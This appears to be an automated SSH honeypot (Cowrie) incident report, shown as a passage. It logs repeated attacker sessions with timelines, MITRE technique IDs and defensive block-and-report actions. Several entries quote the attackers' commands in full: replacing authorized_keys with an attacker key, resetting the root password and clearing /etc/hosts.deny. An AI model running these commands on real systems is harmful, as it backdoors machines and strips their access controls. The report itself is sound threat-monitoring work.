| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:48:19` | `cowrie.session.connect` |
| `2026-04-20 21:48:19` | `cowrie.client.version` |
| `2026-04-20 21:48:19` | `cowrie.client.kex` |
| `2026-04-20 21:48:20` | `cowrie.login.success` |
| `2026-04-20 21:48:20` | `cowrie.session.params` |
| `2026-04-20 21:48:20` | `cowrie.command.input` |
| `2026-04-20 21:48:20` | `cowrie.command.failed` |
| `2026-04-20 21:48:20` | `cowrie.log.closed` |
| `2026-04-20 21:48:21` | `cowrie.session.params` |
| `2026-04-20 21:48:21` | `cowrie.command.input` |
| `2026-04-20 21:48:21` | `cowrie.session.file_download` |
| `2026-04-20 21:48:21` | `cowrie.log.closed` |
| `2026-04-20 21:48:33` | `cowrie.session.params` |
| `2026-04-20 21:48:33` | `cowrie.command.input` |
| `2026-04-20 21:48:33` | `cowrie.log.closed` |
| `2026-04-20 21:48:34` | `cowrie.session.params` |
| `2026-04-20 21:48:34` | `cowrie.command.input` |
| `2026-04-20 21:48:34` | `cowrie.log.closed` |
| `2026-04-20 21:48:35` | `cowrie.session.params` |
| `2026-04-20 21:48:35` | `cowrie.command.input` |
| `2026-04-20 21:48:35` | `cowrie.session.file_download` |
| `2026-04-20 21:48:35` | `cowrie.log.closed` |
| `2026-04-20 21:48:35` | `cowrie.session.params` |
| `2026-04-20 21:48:35` | `cowrie.command.input` |
| `2026-04-20 21:48:35` | `cowrie.log.closed` |
| `2026-04-20 21:48:36` | `cowrie.session.params` |
| `2026-04-20 21:48:36` | `cowrie.command.input` |
| `2026-04-20 21:48:36` | `cowrie.log.closed` |
| `2026-04-20 21:48:36` | `cowrie.session.params` |
| `2026-04-20 21:48:36` | `cowrie.command.input` |
| `2026-04-20 21:48:36` | `cowrie.command.input` |
| `2026-04-20 21:48:37` | `cowrie.log.closed` |
| `2026-04-20 21:48:37` | `cowrie.session.params` |
| `2026-04-20 21:48:37` | `cowrie.command.input` |
| `2026-04-20 21:48:37` | `cowrie.log.closed` |
| `2026-04-20 21:48:38` | `cowrie.session.params` |
| `2026-04-20 21:48:38` | `cowrie.command.input` |
| `2026-04-20 21:48:38` | `cowrie.log.closed` |
| `2026-04-20 21:48:38` | `cowrie.session.params` |
| `2026-04-20 21:48:38` | `cowrie.command.input` |
| `2026-04-20 21:48:38` | `cowrie.log.closed` |
| `2026-04-20 21:48:39` | `cowrie.session.params` |
| `2026-04-20 21:48:39` | `cowrie.command.input` |
| `2026-04-20 21:48:39` | `cowrie.log.closed` |
| `2026-04-20 21:48:39` | `cowrie.session.params` |
| `2026-04-20 21:48:39` | `cowrie.command.input` |
| `2026-04-20 21:48:40` | `cowrie.log.closed` |
| `2026-04-20 21:48:40` | `cowrie.session.params` |
| `2026-04-20 21:48:40` | `cowrie.command.input` |
| `2026-04-20 21:48:40` | `cowrie.log.closed` |
| `2026-04-20 21:48:41` | `cowrie.session.params` |
| `2026-04-20 21:48:41` | `cowrie.command.input` |
| `2026-04-20 21:48:41` | `cowrie.log.closed` |
| `2026-04-20 21:48:41` | `cowrie.session.params` |
| `2026-04-20 21:48:41` | `cowrie.command.input` |
| `2026-04-20 21:48:41` | `cowrie.log.closed` |
| `2026-04-20 21:48:42` | `cowrie.session.params` |
| `2026-04-20 21:48:42` | `cowrie.command.input` |
| `2026-04-20 21:48:42` | `cowrie.log.closed` |
| `2026-04-20 21:48:42` | `cowrie.session.params` |
| `2026-04-20 21:48:42` | `cowrie.command.input` |
| `2026-04-20 21:48:43` | `cowrie.log.closed` |
| `2026-04-20 21:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7641b02c3724

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-04-20 21:50 |
| **Last Seen** | 2026-04-20 21:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:50:59` | `cowrie.session.connect` |
| `2026-04-20 21:50:59` | `cowrie.client.version` |
| `2026-04-20 21:50:59` | `cowrie.client.kex` |
| `2026-04-20 21:51:00` | `cowrie.login.success` |
| `2026-04-20 21:51:00` | `cowrie.session.params` |
| `2026-04-20 21:51:00` | `cowrie.command.input` |
| `2026-04-20 21:51:00` | `cowrie.command.failed` |
| `2026-04-20 21:51:00` | `cowrie.log.closed` |
| `2026-04-20 21:51:01` | `cowrie.session.params` |
| `2026-04-20 21:51:01` | `cowrie.command.input` |
| `2026-04-20 21:51:01` | `cowrie.session.file_download` |
| `2026-04-20 21:51:01` | `cowrie.log.closed` |
| `2026-04-20 21:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0b66d3787cc

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-04-20 21:51 |
| **Last Seen** | 2026-04-20 21:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:51:08` | `cowrie.session.connect` |
| `2026-04-20 21:51:08` | `cowrie.client.version` |
| `2026-04-20 21:51:08` | `cowrie.client.kex` |
| `2026-04-20 21:51:09` | `cowrie.login.success` |
| `2026-04-20 21:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-686b626ddfa1

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-04-20 21:53 |
| **Last Seen** | 2026-04-20 21:53 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:53:38` | `cowrie.session.connect` |
| `2026-04-20 21:53:38` | `cowrie.client.version` |
| `2026-04-20 21:53:38` | `cowrie.client.kex` |
| `2026-04-20 21:53:39` | `cowrie.login.success` |
| `2026-04-20 21:53:39` | `cowrie.session.params` |
| `2026-04-20 21:53:39` | `cowrie.command.input` |
| `2026-04-20 21:53:39` | `cowrie.command.failed` |
| `2026-04-20 21:53:39` | `cowrie.log.closed` |
| `2026-04-20 21:53:40` | `cowrie.session.params` |
| `2026-04-20 21:53:40` | `cowrie.command.input` |
| `2026-04-20 21:53:40` | `cowrie.session.file_download` |
| `2026-04-20 21:53:40` | `cowrie.log.closed` |
| `2026-04-20 21:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcd286109866

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-04-20 21:53 |
| **Last Seen** | 2026-04-20 21:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:53:48` | `cowrie.session.connect` |
| `2026-04-20 21:53:48` | `cowrie.client.version` |
| `2026-04-20 21:53:48` | `cowrie.client.kex` |
| `2026-04-20 21:53:49` | `cowrie.login.success` |
| `2026-04-20 21:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-734516534ab0

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 21:59 |
| **Last Seen** | 2026-04-20 21:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:59:02` | `cowrie.session.connect` |
| `2026-04-20 21:59:02` | `cowrie.client.version` |
| `2026-04-20 21:59:03` | `cowrie.client.kex` |
| `2026-04-20 21:59:04` | `cowrie.login.success` |
| `2026-04-20 21:59:04` | `cowrie.session.params` |
| `2026-04-20 21:59:04` | `cowrie.command.input` |
| `2026-04-20 21:59:04` | `cowrie.command.failed` |
| `2026-04-20 21:59:05` | `cowrie.log.closed` |
| `2026-04-20 21:59:06` | `cowrie.session.params` |
| `2026-04-20 21:59:06` | `cowrie.command.input` |
| `2026-04-20 21:59:06` | `cowrie.session.file_download` |
| `2026-04-20 21:59:06` | `cowrie.log.closed` |
| `2026-04-20 21:59:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a69bc807389b

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 21:59 |
| **Last Seen** | 2026-04-20 21:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 21:59:10` | `cowrie.session.connect` |
| `2026-04-20 21:59:10` | `cowrie.client.version` |
| `2026-04-20 21:59:10` | `cowrie.client.kex` |
| `2026-04-20 21:59:11` | `cowrie.login.success` |
| `2026-04-20 21:59:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95c607523916

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:00 |
| **Last Seen** | 2026-04-20 22:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:00:43` | `cowrie.session.connect` |
| `2026-04-20 22:00:43` | `cowrie.client.version` |
| `2026-04-20 22:00:44` | `cowrie.client.kex` |
| `2026-04-20 22:00:45` | `cowrie.login.success` |
| `2026-04-20 22:00:46` | `cowrie.session.params` |
| `2026-04-20 22:00:46` | `cowrie.command.input` |
| `2026-04-20 22:00:46` | `cowrie.command.failed` |
| `2026-04-20 22:00:46` | `cowrie.log.closed` |
| `2026-04-20 22:00:47` | `cowrie.session.params` |
| `2026-04-20 22:00:47` | `cowrie.command.input` |
| `2026-04-20 22:00:47` | `cowrie.session.file_download` |
| `2026-04-20 22:00:47` | `cowrie.log.closed` |
| `2026-04-20 22:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b093f2e2d14

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:00 |
| **Last Seen** | 2026-04-20 22:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:00:51` | `cowrie.session.connect` |
| `2026-04-20 22:00:51` | `cowrie.client.version` |
| `2026-04-20 22:00:51` | `cowrie.client.kex` |
| `2026-04-20 22:00:52` | `cowrie.login.success` |
| `2026-04-20 22:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6b7dcf9da32

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-04-20 22:04 |
| **Last Seen** | 2026-04-20 22:04 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:04:06` | `cowrie.session.connect` |
| `2026-04-20 22:04:06` | `cowrie.client.version` |
| `2026-04-20 22:04:06` | `cowrie.client.kex` |
| `2026-04-20 22:04:07` | `cowrie.login.success` |
| `2026-04-20 22:04:07` | `cowrie.session.params` |
| `2026-04-20 22:04:07` | `cowrie.command.input` |
| `2026-04-20 22:04:07` | `cowrie.command.failed` |
| `2026-04-20 22:04:08` | `cowrie.log.closed` |
| `2026-04-20 22:04:08` | `cowrie.session.params` |
| `2026-04-20 22:04:08` | `cowrie.command.input` |
| `2026-04-20 22:04:08` | `cowrie.session.file_download` |
| `2026-04-20 22:04:08` | `cowrie.log.closed` |
| `2026-04-20 22:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7db602955150

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-04-20 22:04 |
| **Last Seen** | 2026-04-20 22:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:04:16` | `cowrie.session.connect` |
| `2026-04-20 22:04:16` | `cowrie.client.version` |
| `2026-04-20 22:04:17` | `cowrie.client.kex` |
| `2026-04-20 22:04:17` | `cowrie.login.success` |
| `2026-04-20 22:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.180.79[.]132` to AbuseIPDB if not already reported
- [ ] Block `158.180.79[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91651e9582d5

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:06 |
| **Last Seen** | 2026-04-20 22:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:06:19` | `cowrie.session.connect` |
| `2026-04-20 22:06:19` | `cowrie.client.version` |
| `2026-04-20 22:06:19` | `cowrie.client.kex` |
| `2026-04-20 22:06:20` | `cowrie.login.success` |
| `2026-04-20 22:06:21` | `cowrie.session.params` |
| `2026-04-20 22:06:21` | `cowrie.command.input` |
| `2026-04-20 22:06:21` | `cowrie.command.failed` |
| `2026-04-20 22:06:21` | `cowrie.log.closed` |
| `2026-04-20 22:06:22` | `cowrie.session.params` |
| `2026-04-20 22:06:22` | `cowrie.command.input` |
| `2026-04-20 22:06:22` | `cowrie.session.file_download` |
| `2026-04-20 22:06:22` | `cowrie.log.closed` |
| `2026-04-20 22:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24c09e4e7f3b

| Field | Detail |
|---|---|
| **Source IP** | `181.65.191[.]218` |
| **First Seen** | 2026-04-20 22:06 |
| **Last Seen** | 2026-04-20 22:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:06:26` | `cowrie.session.connect` |
| `2026-04-20 22:06:26` | `cowrie.client.version` |
| `2026-04-20 22:06:26` | `cowrie.client.kex` |
| `2026-04-20 22:06:28` | `cowrie.login.success` |
| `2026-04-20 22:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.65.191[.]218` to AbuseIPDB if not already reported
- [ ] Block `181.65.191[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5201ef087aea

| Field | Detail |
|---|---|
| **Source IP** | `158.180.79[.]132` |
| **First Seen** | 2026-04-20 22:06 |
| **Last Seen** | 2026-04-20 22:07 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:cydPx2Bl9MW8"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 22:06:44` | `cowrie.session.connect` |
| `2026-04-20 22:06:44` | `cowrie.client.version` |
| `2026-04-20 22:06:45` | `cowrie.client.kex` |
| `2026-04-20 22:06:45` | `cowrie.login.success` |
| `2026-04-20 22:06:46` | `cowrie.session.params` |
| `2026-04-20 22:06:46` | `cowrie.command.input` |
| `2026-04-20 22:06:46` | `cowrie.command.failed` |
| `2026-04-20 22:06:46` | `cowrie.log.closed` |
| `2026-04-20 22:06:46` | `cowrie.session.params` |
| `2026-04-20 22:06:46` | `cowrie.command.input` |
| `2026-04-20 22:06:47` | `cowrie.session.file_download` |
| `2026-04-20 22:06:47` | `cowrie.log.closed` |
| `2026-04-20 22:06:56` | `cowrie.session.params` |
| `2026-04-20 22:06:56` | `cowrie.command.input` |
| `2026-04-20 22:06:56` | `cowrie.log.closed` |
| `2026-04-20 22:06:57` | `cowrie.session.params` |
| `2026-04-20 22:06:57` | `cowrie.command.input` |
| `2026-04-20 22:06:57` | `cowrie.log.closed` |
| `2026-04-20 22:06:58` | `cowrie.session.params` |
| `2026-04-20 22:06:58` | `cowrie.command.input` |
| `2026-04-20 22:06:58` | `cowrie.session.file_download` |
| `2026-04-20 22:06:58` | `cowrie.log.closed` |
| `2026-04-20 22:06:58` | `cowrie.session.params` |
| `2026-04-20 22:06:58` | `cowrie.command.input` |
| `2026-04-20 22:06:58` | `cowrie.log.closed` |
| `2026-04-20 22:06:59` | `cowrie.session.params` |
| `2026-04-20 22:06:59` | `cowrie.command.input` |
| `2026-04-20 22:06:59` | `cowrie.log.closed` |
| `2026-04-20 22:06:59` | `cowrie.session.params` |
| `2026-04-20 22:06:59` | `cowrie.command.input` |
| `2026-04-20 22:06:59` | `cowrie.command.input` |
| `2026-04-20 22:06:59` | `cowrie.log.closed` |
| `2026-04-20 22:07:00` | `cowrie.session.params` |
| `2026-04-20 22:07:00` | `cowrie.command.input` |
| `2026-04-20 22:07:00` | `cowrie.log.closed` |
| `2026-04-20 22:07:01` | `cowrie.session.params` |
| `2026-04-20 22:07:01` | `cowrie.command.input` |
| `2026-04-20 22:07:01` | `cowrie.log.closed` |
| `2026-04-20 22:07:01` | `cowrie.session.params` |
| `2026-04-20 22:07:01` | `cowrie.command.input` |
| `2026-04-20 22:07:01` | `cowrie.log.closed` |
| `2026-04-20 22:07:02` | `cowrie.session.params` |
